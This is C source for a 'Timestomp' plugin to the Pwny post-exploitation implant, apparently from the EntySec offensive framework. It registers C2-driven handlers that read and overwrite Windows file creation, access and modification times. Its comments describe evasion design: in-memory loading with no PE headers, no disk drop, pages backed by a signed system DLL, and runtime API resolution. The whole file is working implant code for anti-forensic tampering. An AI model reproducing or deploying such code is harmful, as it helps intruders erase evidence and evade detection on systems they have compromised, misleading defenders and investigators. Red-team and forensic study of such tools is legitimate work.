/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Timestomp COT plugin — file timestamp manipulation.
 *
 * Built as a COT (Code-Only Tab) blob: no PE headers in memory,
 * no disk drop, all executable pages backed by a signed system DLL.
 * All Pwny API calls go through the vtable; all Win32 APIs are
 * resolved at runtime via cot_resolve().
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                                        LPSECURITY_ATTRIBUTES, DWORD,
                                        DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_GetFileTime)(HANDLE, LPFILETIME, LPFILETIME,
                                        LPFILETIME);
typedef BOOL   (WINAPI *fn_SetFileTime)(HANDLE, const FILETIME *,
                                        const FILETIME *, const FILETIME *);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef DWORD  (WINAPI *fn_GetLastError)(void);

static struct
{
    fn_CreateFileA  pCreateFileA;
    fn_GetFileTime  pGetFileTime;
    fn_SetFileTime  pSetFileTime;
    fn_CloseHandle  pCloseHandle;
    fn_GetLastError pGetLastError;
} w;

/* ------------------------------------------------------------------ */
/* Tag definitions                                                     */
/* ------------------------------------------------------------------ */


#define TIMESTOMP_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define TIMESTOMP_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_TS_PATH   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_TS_MTIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_TS_ATIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_TS_CTIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static void unix_to_filetime(int64_t unix_time, FILETIME *ft)
{
    ULARGE_INTEGER ull;
    ull.QuadPart = ((ULONGLONG)unix_time + 11644473600ULL) * 10000000ULL;
    ft->dwLowDateTime = ull.LowPart;
    ft->dwHighDateTime = ull.HighPart;
}

static int64_t filetime_to_unix(const FILETIME *ft)
{
    ULARGE_INTEGER ull;
    ull.LowPart = ft->dwLowDateTime;
    ull.HighPart = ft->dwHighDateTime;
    return (int64_t)(ull.QuadPart / 10000000ULL - 11644473600ULL);
}

/* ------------------------------------------------------------------ */
/* Handlers                                                            */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *timestomp_get(c2_t *c2)
{
    char path[1024];
    HANDLE hFile;
    FILETIME ftCreate, ftAccess, ftWrite;
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TS_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hFile = w.pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        log_debug("* timestomp_get: CreateFile failed (%lu)\n", w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pGetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite))
    {
        log_debug("* timestomp_get: GetFileTime failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hFile);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseHandle(hFile);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_TS_MTIME, (int32_t)filetime_to_unix(&ftWrite));
    tlv_pkt_add_u32(result, TLV_TYPE_TS_ATIME, (int32_t)filetime_to_unix(&ftAccess));
    tlv_pkt_add_u32(result, TLV_TYPE_TS_CTIME, (int32_t)filetime_to_unix(&ftCreate));

    return result;
}

static tlv_pkt_t *timestomp_set(c2_t *c2)
{
    char path[1024];
    HANDLE hFile;
    FILETIME ftCreate, ftAccess, ftWrite;
    FILETIME *pftCreate = NULL;
    FILETIME *pftAccess = NULL;
    FILETIME *pftWrite = NULL;
    int32_t mtime, atime, ctime;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TS_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hFile = w.pCreateFileA(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        log_debug("* timestomp_set: CreateFile failed (%lu)\n", w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_MTIME, &mtime) == 0)
    {
        unix_to_filetime((int64_t)mtime, &ftWrite);
        pftWrite = &ftWrite;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_ATIME, &atime) == 0)
    {
        unix_to_filetime((int64_t)atime, &ftAccess);
        pftAccess = &ftAccess;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_CTIME, &ctime) == 0)
    {
        unix_to_filetime((int64_t)ctime, &ftCreate);
        pftCreate = &ftCreate;
    }

    if (!w.pSetFileTime(hFile, pftCreate, pftAccess, pftWrite))
    {
        log_debug("* timestomp_set: SetFileTime failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hFile);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseHandle(hFile);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Resolve Win32 APIs once at load time */
    w.pCreateFileA  = (fn_CreateFileA)cot_resolve("kernel32.dll", "CreateFileA");
    w.pGetFileTime  = (fn_GetFileTime)cot_resolve("kernel32.dll", "GetFileTime");
    w.pSetFileTime  = (fn_SetFileTime)cot_resolve("kernel32.dll", "SetFileTime");
    w.pCloseHandle  = (fn_CloseHandle)cot_resolve("kernel32.dll", "CloseHandle");
    w.pGetLastError = (fn_GetLastError)cot_resolve("kernel32.dll", "GetLastError");

    /* Register handlers */
    api_call_register(api_calls, TIMESTOMP_SET, (api_t)timestomp_set);
    api_call_register(api_calls, TIMESTOMP_GET, (api_t)timestomp_get);
}

#endif
